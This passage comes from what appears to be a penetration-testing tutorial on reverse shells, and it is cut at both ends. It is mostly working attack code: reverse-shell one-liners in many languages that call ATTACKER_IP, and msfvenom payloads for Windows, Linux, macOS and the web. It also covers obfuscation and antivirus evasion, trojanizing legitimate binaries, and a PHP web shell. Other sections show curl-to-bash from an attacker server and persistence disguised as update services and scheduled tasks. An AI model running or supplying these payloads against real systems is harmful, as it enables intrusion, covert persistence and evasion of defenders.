      si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

      CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

      WaitForSingleObject(pi.hProcess, INFINITE);
      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);
      WSACleanup();
      return 0;
  }
  ```

  ```bash [Cross-Compile from Linux]
  x86_64-w64-mingw32-gcc win_reverse.c -o reverse.exe -lws2_32
  ```
  :::
::

### More Languages — Quick Reference

::code-group
  ```lua [Lua Reverse Shell]
  lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
  ```

  ```go [Go Reverse Shell]
  echo 'package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","ATTACKER_IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go
  ```

  ```text [AWK Reverse Shell]
  awk 'BEGIN{s="/inet/tcp/0/ATTACKER_IP/4444";while(42){do{printf "$ " |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}while(c != "exit")close(s)}}'
  ```

  ```bash [Socat Reverse Shell]
  socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
  ```

  ```bash [Socat Encrypted Reverse Shell]
  socat OPENSSL:ATTACKER_IP:4443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
  ```

  ```bash [Telnet Reverse Shell]
  TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 4444 0<$TF | /bin/sh 1>$TF
  ```

  ```bash [OpenSSL Reverse Shell]
  mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4443 > /tmp/s; rm /tmp/s
  ```

  ```bash [Xterm Reverse Shell]
  xterm -display ATTACKER_IP:1
  # Attacker must run: Xnest :1 or xhost +target_ip
  ```
::

## msfvenom Payload Generation

When one-liners are not enough, `msfvenom` generates sophisticated payloads for every platform and format.

### Understanding Payload Architecture

::tabs
  :::tabs-item{icon="i-lucide-info" label="Staged vs Stageless"}
  | Feature | Staged | Stageless |
  | ------- | ------ | --------- |
  | Naming | `shell/reverse_tcp` (with `/`) | `shell_reverse_tcp` (with `_`) |
  | Size | Small (5-15 KB) | Large (50-500 KB) |
  | How it works | Downloads the full payload after connecting | Full payload in one shot |
  | Network artifacts | Two connections — stager then stage | One connection |
  | Listener required | Metasploit multi/handler ONLY | Any listener (nc, ncat, socat) |
  | Detection | Smaller initial payload may bypass size-based AV | Larger but fewer network signatures |
  | Reliability | Can fail if stage download is interrupted | More reliable — all or nothing |
  | Use case | Size-restricted exploits (buffer overflows) | Web shells, file uploads, social engineering |

  ::tip
  **Critical distinction:** Staged payloads (`/`) **require** Metasploit's `multi/handler` to serve the second stage. A plain Netcat listener will catch the connection but the shell will immediately die because there is no stage server.

  Stageless payloads (`_`) work with **any** listener — Netcat, Ncat, Socat, or Metasploit.
  ::
  :::

  :::tabs-item{icon="i-lucide-info" label="Shell Types"}
  | Payload | Description | Interaction Level |
  | ------- | ----------- | ----------------- |
  | `shell` / `shell_reverse_tcp` | Raw system shell (cmd.exe / /bin/sh) | Basic — no special features |
  | `meterpreter` / `meterpreter_reverse_tcp` | Advanced post-exploitation shell | Full — file ops, pivoting, keylogging |
  | `powershell` | PowerShell-based shell | Medium — Windows scripting capability |
  | `cmd/unix/interact` | Simple interactive shell | Minimal |
  :::
::

### Reverse Shell Payloads

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Windows"}
  ```bash [EXE — Staged Meterpreter]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f exe -o shell_staged.exe
  ```

  ```bash [EXE — Stageless Meterpreter]
  msfvenom -p windows/x64/meterpreter_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f exe -o shell_stageless.exe
  ```

  ```bash [EXE — Raw Shell (Works with Netcat)]
  msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f exe -o shell_raw.exe
  ```

  ```bash [DLL — For DLL Hijacking]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f dll -o payload.dll
  ```

  ```bash [MSI — For AlwaysInstallElevated Privesc]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f msi -o payload.msi
  ```

  ```bash [HTA — HTML Application]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f hta-psh -o payload.hta
  ```

  ```bash [PowerShell Command]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f psh-cmd -o payload.bat
  ```

  ```bash [VBA Macro (Office Documents)]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f vba -o macro.vba
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Linux"}
  ```bash [ELF — Staged Meterpreter]
  msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f elf -o shell_staged.elf
  ```

  ```bash [ELF — Stageless Meterpreter]
  msfvenom -p linux/x64/meterpreter_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f elf -o shell_stageless.elf
  ```

  ```bash [ELF — Raw Shell]
  msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f elf -o shell_raw.elf
  ```

  ```bash [Python]
  msfvenom -p python/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -o shell.py
  ```

  ```bash [Shared Object (.so) — For LD_PRELOAD]
  msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f elf-so -o payload.so
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="macOS"}
  ```bash [Mach-O Binary]
  msfvenom -p osx/x64/meterpreter_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f macho -o shell.macho
  ```

  ```bash [Shell (Mach-O)]
  msfvenom -p osx/x64/shell_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f macho -o shell_raw.macho
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Web Payloads"}
  ```bash [PHP]
  msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f raw -o shell.php
  # Prepend <?php to the output file
  ```

  ```bash [ASP]
  msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f asp -o shell.asp
  ```

  ```bash [ASPX]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f aspx -o shell.aspx
  ```

  ```bash [JSP]
  msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f raw -o shell.jsp
  ```

  ```bash [WAR (Tomcat)]
  msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f war -o shell.war
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Shellcode"}
  ```bash [C Shellcode]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f c -b '\x00'
  ```

  ```bash [Python Shellcode]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f python -b '\x00'
  ```

  ```bash [C# Shellcode]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f csharp -b '\x00'
  ```

  ```bash [Raw Shellcode (For Custom Loaders)]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f raw -o shellcode.bin
  ```
  :::
::

### Bind Shell Payloads

::code-group
  ```bash [Windows Bind Shell (EXE)]
  msfvenom -p windows/x64/meterpreter/bind_tcp \
    RHOST=TARGET_IP LPORT=4444 \
    -f exe -o bind_shell.exe
  ```

  ```bash [Windows Bind Shell (Stageless)]
  msfvenom -p windows/x64/shell_bind_tcp \
    LPORT=4444 \
    -f exe -o bind_raw.exe
  ```

  ```bash [Linux Bind Shell (ELF)]
  msfvenom -p linux/x64/meterpreter/bind_tcp \
    LPORT=4444 \
    -f elf -o bind_shell.elf
  ```

  ```bash [Linux Bind Shell (Raw)]
  msfvenom -p linux/x64/shell_bind_tcp \
    LPORT=4444 \
    -f elf -o bind_raw.elf
  ```

  ```bash [PHP Bind Shell]
  msfvenom -p php/bind_php \
    LPORT=4444 \
    -f raw -o bind_shell.php
  ```

  ```bash [Python Bind Shell]
  msfvenom -p python/meterpreter/bind_tcp \
    LPORT=4444 \
    -o bind_shell.py
  ```
::

::note
For bind shell payloads, the handler configuration is different:

```bash [msf6 — Bind Shell Handler]
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOST TARGET_IP
set LPORT 4444
exploit
```

Notice: You set `RHOST` (target IP) instead of `LHOST` (your IP) because **you** are connecting **to** the target.
::

### Encrypted Payloads

::code-group
  ```bash [HTTPS Reverse (Encrypted Channel)]
  msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=ATTACKER_IP LPORT=443 \
    HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    -f exe -o https_shell.exe
  ```

  ```bash [HTTPS Stageless]
  msfvenom -p windows/x64/meterpreter_reverse_https \
    LHOST=ATTACKER_IP LPORT=443 \
    -f exe -o https_stageless.exe
  ```

  ```bash [DNS Reverse (Tunnel Through DNS)]
  msfvenom -p windows/x64/meterpreter/reverse_dns \
    LHOST=ATTACKER_IP LPORT=53 \
    -f exe -o dns_shell.exe
  ```
::

## Shell Upgrade Techniques

Raw shells are painful — no tab completion, no arrow keys, no job control, :kbd{value="Ctrl"} + :kbd{value="C"} kills your shell instead of the running process. Upgrading to a fully interactive TTY is essential.

### The Upgrade Path

```text [Shell Quality Levels]
Level 0: Web Shell (command execution via HTTP)
    ↓ Upgrade to reverse shell
Level 1: Dumb Shell (no TTY, no tab completion, no signals)
    ↓ Spawn PTY
Level 2: Semi-Interactive Shell (PTY but no proper terminal)
    ↓ Background, configure terminal, foreground
Level 3: Fully Interactive Shell (tab complete, arrow keys, Ctrl+C works)
    ↓ Optionally upgrade to Meterpreter
Level 4: Meterpreter (full post-exploitation capabilities)
```

### Step-by-Step Full TTY Upgrade

::steps{level="4"}

#### Check Available Utilities

```bash [target$]
which python python3 script perl ruby socat
```

#### Spawn a PTY Shell

::code-group
  ```bash [Python 3 (Most Common)]
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  ```

  ```bash [Python 2]
  python -c 'import pty;pty.spawn("/bin/bash")'
  ```

  ```bash [Script Command]
  script -qc /bin/bash /dev/null
  ```

  ```bash [Perl]
  perl -e 'exec "/bin/bash";'
  ```

  ```bash [Ruby]
  ruby -e 'exec "/bin/bash"'
  ```

  ```bash [Expect]
  expect -c 'spawn /bin/bash; interact'
  ```

  ```bash [Socat (If Available on Target)]
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
  ```
::

#### Background the Shell

Press :kbd{value="Ctrl"} + :kbd{value="Z"} to suspend the shell and return to your local terminal.

```text [Output]
[1]+  Stopped                 nc -lvnp 4444
```

#### Configure Your Local Terminal

```bash [Local Terminal]
stty raw -echo; fg
```


  ::field{name="stty raw" type="command"}
  Passes raw keyboard input to the remote shell. This enables arrow keys, :kbd{value="Ctrl"} + :kbd{value="C"}, :kbd{value="Ctrl"} + :kbd{value="Z"}, and other key combinations.
  ::

  ::field{name="-echo" type="command"}
  Disables local echo. Without this, every character you type appears twice.
  ::

  ::field{name="fg" type="command"}
  Brings the suspended Netcat listener (and your shell) back to the foreground.
  ::
::

#### Set Terminal Environment Variables

```bash [target$]
export TERM=xterm-256color
export SHELL=/bin/bash
```

#### Fix Terminal Size

On your **local** terminal (open a new tab):

```bash [Local Terminal]
stty size
# Output: 50 160 (rows columns)
```

On the **target** shell:

```bash [target$]
stty rows 50 cols 160
```

::tip
**If you mess up** and your terminal becomes unresponsive after `stty raw -echo`:

1. Type `reset` blindly (you will not see what you type)
2. Press :kbd{value="Enter"}
3. Your terminal should reset to normal

Alternatively, close the terminal and open a new one. The shell connection is lost, but your sanity is saved.
::

### Quick Upgrade Reference

::collapsible

| Method | Command | Notes |
| ------ | ------- | ----- |
| Python 3 PTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` | Most reliable |
| Python 2 PTY | `python -c 'import pty;pty.spawn("/bin/bash")'` | Legacy systems |
| Script | `script -qc /bin/bash /dev/null` | Works without Python |
| Perl | `perl -e 'exec "/bin/bash"'` | Available on most Unix |
| Background | :kbd{value="Ctrl"} + :kbd{value="Z"} | Suspend shell |
| Raw mode + fg | `stty raw -echo; fg` | Enable full interactivity |
| Set TERM | `export TERM=xterm-256color` | Enable colors and features |
| Fix size | `stty rows R cols C` | Match your local terminal |
| Reset terminal | Type `reset` blindly + :kbd{value="Enter"} | Emergency recovery |

::

### Upgrading to Meterpreter

::code-group
  ```bash [From Within Metasploit Session]
  # If you caught a raw shell in Metasploit
  sessions -u 1
  # This auto-upgrades session 1 to meterpreter
  ```

  ```bash [Manual Upgrade via Post Module]
  use post/multi/manage/shell_to_meterpreter
  set SESSION 1
  set LHOST ATTACKER_IP
  set LPORT 5555
  run
  ```

  ```bash [Upload and Execute Meterpreter Binary]
  # Generate a stageless meterpreter binary
  msfvenom -p linux/x64/meterpreter_reverse_tcp \
    LHOST=ATTACKER_IP LPORT=5555 \
    -f elf -o meterpreter.elf

  # From your dumb shell on the target:
  wget http://ATTACKER_IP:8000/meterpreter.elf -O /tmp/m
  chmod +x /tmp/m
  /tmp/m &
  ```
::

## Evasion Techniques

Modern security solutions detect common shell payloads. These techniques help bypass basic defenses during **authorized** tests.

### Encoding & Obfuscation

::tabs
  :::tabs-item{icon="i-lucide-lock" label="msfvenom Encoding"}
  ```bash [Shikata Ga Nai (Polymorphic)]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -e x86/shikata_ga_nai -i 7 \
    -f exe -o encoded.exe
  ```

  ```bash [Multiple Encoders Chained]
  msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -e x86/shikata_ga_nai -i 3 \
    -f raw | \
  msfvenom -e x86/alpha_mixed -i 2 \
    -a x86 --platform windows \
    -f exe -o double_encoded.exe
  ```
  :::

  :::tabs-item{icon="i-lucide-lock" label="Base64 Obfuscation"}
  ```bash [Linux — Base64 Encoded Reverse Shell]
  # Encode
  echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64

  # Execute on target
  echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=" | base64 -d | bash
  ```

  ```powershell [Windows — PowerShell Base64]
  # Create and encode
  $cmd = '$c=New-Object Net.Sockets.TCPClient("ATTACKER_IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()'
  $bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
  [Convert]::ToBase64String($bytes)

  # Execute on target
  powershell -nop -ep bypass -enc <BASE64_STRING>
  ```
  :::

  :::tabs-item{icon="i-lucide-lock" label="String Manipulation"}
  ```bash [Bash — Variable Splitting]
  # Instead of: bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
  a='ba';b='sh';c=' -i';d=' >& /dev/tc';e='p/10.10.10.5/';f='4444 0';g='>&1'
  $a$b$c$d$e$f$g
  ```

  ```powershell [PowerShell — String Concatenation]
  # Instead of: Invoke-Expression
  $a = "Inv"; $b = "oke-Ex"; $c = "pression"
  &($a+$b+$c) "(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
  ```

  ```bash [Bash — Hex Encoding]
  echo -e '\x62\x61\x73\x68\x20\x2d\x69' | bash
  # Decodes to: "bash -i"
  ```
  :::
::

### Template Injection & Trojanizing

```bash [Inject into Legitimate Binary]
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -x /path/to/legitimate_app.exe \
  -k \
  -f exe -o trojanized_app.exe
```

::field-group
  ::field{name="-x" type="flag"}
  Template binary — the legitimate application to inject into. The output looks and functions like the original.
  ::

  ::field{name="-k" type="flag"}
  Keep the template functional. The original application runs normally while the payload executes in a background thread.
  ::
::

### Port Selection Strategy

::callout{icon="i-lucide-lightbulb"}
_"The port you choose for your reverse shell is not random. It is strategic."_
::

| Port | Protocol | Why Use It | Evasion Level |
| ---- | -------- | ---------- | ------------- |
| 443 | HTTPS | Almost never blocked. Blends with normal web traffic. | :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} |
| 80 | HTTP | Rarely blocked. Expect more inspection than 443. | :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} |
| 53 | DNS | Allowed for DNS resolution. Unusual for TCP though. | :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} |
| 8080 | HTTP Alt | Common for web services. Often allowed. | :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} :icon{name="i-lucide-star"} |
| 4444 | Custom | Metasploit default. Detected by every IDS on the planet. | :icon{name="i-lucide-star"} |
| 1234 | Custom | Obvious non-standard port. Easily flagged. | :icon{name="i-lucide-star"} |

::warning
**Never use port 4444 on a real engagement.** It is the default Metasploit port. Every IDS, IPS, SIEM, and SOC analyst's rule set flags traffic on port 4444. Use 443, 80, or 53 instead.
::

### Process Migration & Injection (Post-Shell)

Once you have a shell, move to a more stable and stealthy process:

::code-group
  ```bash [Meterpreter — Auto-Migrate]
  # Set in handler before catching shell
  set AutoRunScript "migrate -N explorer.exe"
  ```

  ```bash [Meterpreter — Manual Migrate]
  meterpreter > ps
  meterpreter > migrate -N svchost.exe
  # or by PID
  meterpreter > migrate 1234
  ```

  ```bash [msfvenom — PrependMigrate]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=443 \
    PrependMigrate=true PrependMigrateProc=svchost.exe \
    -f exe -o auto_migrate.exe
  ```
::

## Advanced Scenarios

### Scenario 1 — Web Shell to Full Interactive Reverse Shell

::steps{level="4"}

#### Upload a Web Shell

```php [shell.php]
<?php echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>
```

Upload via file upload vulnerability, CMS plugin upload, or FTP access.

#### Verify Execution

```text [Browser]
http://target.com/uploads/shell.php?cmd=id
```

::code-collapse
```text [Expected Output]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
::

#### Check Available Tools

```text [Browser]
http://target.com/uploads/shell.php?cmd=which python3 python perl nc ncat bash socat curl wget
```

#### Trigger Reverse Shell

Start your listener first:

```bash [Attacker Terminal]
nc -lvnp 4444
```

Then trigger from the web shell (URL-encode special characters):

```text [Browser]
http://target.com/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27
```

Or use Python:

```text [Browser]
http://target.com/uploads/shell.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket();s.connect((%22ATTACKER_IP%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/bash%22,%22-i%22])%27
```

#### Upgrade the Shell

```bash [target$]
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
# stty raw -echo; fg
# export TERM=xterm-256color
```

::

### Scenario 2 — Bypassing Egress Firewall

The target blocks all outbound connections except HTTP (80) and HTTPS (443).

::steps{level="4"}

#### Test Outbound Connectivity

From your initial (web shell or limited shell) access:

```bash [target$]
# Test common ports
bash -c 'echo test > /dev/tcp/ATTACKER_IP/4444' 2>/dev/null && echo "4444 OPEN" || echo "4444 BLOCKED"
bash -c 'echo test > /dev/tcp/ATTACKER_IP/443' 2>/dev/null && echo "443 OPEN" || echo "443 BLOCKED"
bash -c 'echo test > /dev/tcp/ATTACKER_IP/80' 2>/dev/null && echo "80 OPEN" || echo "80 BLOCKED"
bash -c 'echo test > /dev/tcp/ATTACKER_IP/53' 2>/dev/null && echo "53 OPEN" || echo "53 BLOCKED"
```

#### Use Allowed Port

```bash [Attacker — Listener on 443]
sudo nc -lvnp 443
```

```bash [Target — Reverse Shell on 443]
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

#### If Only HTTP Proxy Allowed

Some environments force all traffic through an HTTP proxy:

```bash [target$]
export http_proxy=http://proxy.internal:8080
curl http://ATTACKER_IP/shell.sh | bash
```

```bash [shell.sh on attacker's web server]
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

#### If DNS is the Only Way Out

Use a DNS tunnel via `dnscat2`:

```bash [Attacker]
dnscat2-server tunnel.yourdomain.com
```

```bash [Target]
./dnscat2 tunnel.yourdomain.com
```

::

### Scenario 3 — Bind Shell Through Pivoted Network

You have compromised Machine A and need to access Machine B on an internal network. Machine B cannot reach the internet.

```text [Network Layout]
┌───────────┐        ┌────────────────┐        ┌────────────────┐
│  Attacker │        │  Machine A     │        │  Machine B     │
│  (Public) │───────▶│  (Compromised) │───────▶│  (Internal)    │
│           │  WAN   │  192.168.1.100 │  LAN   │  10.10.10.50   │
│           │        │  10.10.10.1    │        │  No internet   │
└───────────┘        └────────────────┘        └────────────────┘
```

::steps{level="4"}

#### Deploy Bind Shell on Machine B

From Machine A's shell, exploit Machine B and deploy a bind shell:

```bash [Machine A]
# Upload bind shell payload to Machine B
scp bind_shell.elf user@10.10.10.50:/tmp/

# Or via web exploit, inject:
python3 -c '
import socket,subprocess,os
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)
c, a = s.accept()
os.dup2(c.fileno(), 0)
os.dup2(c.fileno(), 1)
os.dup2(c.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
'
```

#### Connect from Machine A

```bash [Machine A]
nc -nv 10.10.10.50 4444
```

#### Port Forward to Attacker

Set up port forwarding on Machine A so the attacker can reach the bind shell:

```bash [Machine A — SSH Local Port Forward]
ssh -L 4444:10.10.10.50:4444 user@machine_a_external_ip
```

```bash [Attacker]
nc -nv 127.0.0.1 4444
# You are now connected to Machine B's bind shell
```

::

### Scenario 4 — Persistent Reverse Shell Callback

Set up a reverse shell that reconnects automatically if the connection drops.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Bash Persistent"}
  ```bash [persistent_shell.sh]
  #!/bin/bash
  while true; do
      bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
      sleep 60
  done
  ```

  Deploy as a cron job:

  ```bash [target$]
  (crontab -l 2>/dev/null; echo "* * * * * /tmp/.hidden_shell.sh") | crontab -
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Persistent"}
  ```python [persistent.py]
  #!/usr/bin/env python3
  import socket, subprocess, os, time

  ATTACKER = "ATTACKER_IP"
  PORT = 443
  RETRY = 60

  while True:
      try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((ATTACKER, PORT))
          os.dup2(s.fileno(), 0)
          os.dup2(s.fileno(), 1)
          os.dup2(s.fileno(), 2)
          subprocess.call(["/bin/bash", "-i"])
      except Exception:
          pass
      finally:
          try:
              s.close()
          except Exception:
              pass
      time.sleep(RETRY)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Systemd Service (Linux)"}
  ```ini [/etc/systemd/system/update-check.service]
  [Unit]
  Description=System Update Checker
  After=network.target

  [Service]
  Type=simple
  ExecStart=/usr/bin/python3 /opt/.update-checker.py
  Restart=always
  RestartSec=60

  [Install]
  WantedBy=multi-user.target
  ```

  ```bash [target$]
  sudo systemctl enable update-check.service
  sudo systemctl start update-check.service
  ```

  ::warning
  This creates persistence. On a real engagement, **document everything you install and remove it during cleanup**.
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Windows Scheduled Task"}
  ```powershell [target>]
  # Create persistent reverse shell via scheduled task
  schtasks /create /tn "WindowsUpdate" /tr "powershell -nop -ep bypass -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()\"" /sc minute /mo 5 /ru SYSTEM
  ```
  :::
::

## File Transfer Methods

You have a shell but need to move files. Here is every method.

::tabs
  :::tabs-item{icon="i-lucide-download" label="Linux → Target"}
  ```bash [Python HTTP Server (Attacker)]
  python3 -m http.server 8000
  ```

  ```bash [wget (Target)]
  wget http://ATTACKER_IP:8000/payload.elf -O /tmp/payload
  chmod +x /tmp/payload
  ```

  ```bash [curl (Target)]
  curl http://ATTACKER_IP:8000/payload.elf -o /tmp/payload
  chmod +x /tmp/payload
  ```

  ```bash [Netcat File Transfer]
  # Attacker (sender)
  nc -lvnp 9999 < payload.elf

  # Target (receiver)
  nc ATTACKER_IP 9999 > /tmp/payload
  ```

  ```bash [Base64 Transfer (No Tools)]
  # Attacker: encode
  base64 -w 0 payload.elf

  # Target: decode (paste the output)
  echo "BASE64_STRING_HERE" | base64 -d > /tmp/payload
  chmod +x /tmp/payload
  ```

  ```bash [Bash /dev/tcp (No External Tools)]
  # Attacker (sender)
  nc -lvnp 9999 < payload.elf

  # Target (receiver — no nc needed!)
  bash -c 'cat < /dev/tcp/ATTACKER_IP/9999 > /tmp/payload'
  ```
  :::

  :::tabs-item{icon="i-lucide-download" label="Windows → Target"}
  ```powershell [PowerShell WebClient]
  powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/payload.exe','C:\Users\Public\payload.exe')"
  ```

  ```powershell [PowerShell Invoke-WebRequest]
  powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER_IP:8000/payload.exe' -OutFile 'C:\Users\Public\payload.exe'"
  ```

  ```cmd [certutil (Built-in)]
  certutil -urlcache -split -f http://ATTACKER_IP:8000/payload.exe C:\Users\Public\payload.exe
  ```

  ```cmd [bitsadmin (Built-in)]
  bitsadmin /transfer myJob /download /priority high http://ATTACKER_IP:8000/payload.exe C:\Users\Public\payload.exe
  ```

  ```powershell [SMB Share]
  # Attacker: start SMB server
  # impacket-smbserver share /path/to/files -smb2support

  # Target: copy from share
  copy \\ATTACKER_IP\share\payload.exe C:\Users\Public\payload.exe
  ```
  :::
::

## Troubleshooting

::accordion
  :::accordion-item{icon="i-lucide-circle-help" label="Reverse shell connects then immediately dies"}
  **Causes:**
  - AV/EDR killed the process
  - Staged payload but listener is plain Netcat (needs Metasploit)
  - Unstable process — shell was spawned from a dying process
  - Firewall RST the connection after initial SYN-ACK

  **Fixes:**
  - Use stageless payload with Netcat listener
  - Use `PrependMigrate=true` in msfvenom
  - Try a different payload type (Python instead of Bash)
  - Try a different port (443 instead of 4444)
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="No callback received at all"}
  **Diagnostic checklist:**

  | Check | Command |
  | ----- | ------- |
  | Is your listener running? | `ss -tlnp \| grep 4444` |
  | Is your firewall allowing inbound? | `sudo ufw allow 4444/tcp` or `iptables -I INPUT -p tcp --dport 4444 -j ACCEPT` |
  | Is the target's egress blocked? | Try ports 443, 80, 53 |
  | Is LHOST correct? | `ip a` — use your actual IP, not 127.0.0.1 |
  | Are you behind NAT? | Use a VPS with a public IP as your listener |
  | Did the payload execute? | Check command output on the target |
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="Shell is non-interactive (can't run su, sudo, vim, ssh)"}
  You have a dumb shell without a TTY. Upgrade it:

  ```bash [Quick Fix]
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  ```

  Then do the full upgrade:

  ```bash [Full TTY]
  # Ctrl+Z
  stty raw -echo; fg
  export TERM=xterm-256color
  stty rows 50 cols 160
  ```
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="Ctrl+C kills my Netcat listener instead of the remote process"}
  Your shell is not a proper TTY. After running `stty raw -echo; fg`, :kbd{value="Ctrl"} + :kbd{value="C"} will be sent to the remote process instead of killing your local Netcat.

  If you have not done the TTY upgrade, use a different method to interrupt processes on the remote end.
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="PowerShell payloads are blocked by AMSI/AV"}
  AMSI (Antimalware Scan Interface) inspects PowerShell commands in real-time.

  ```powershell [Basic AMSI Bypass (May be patched)]
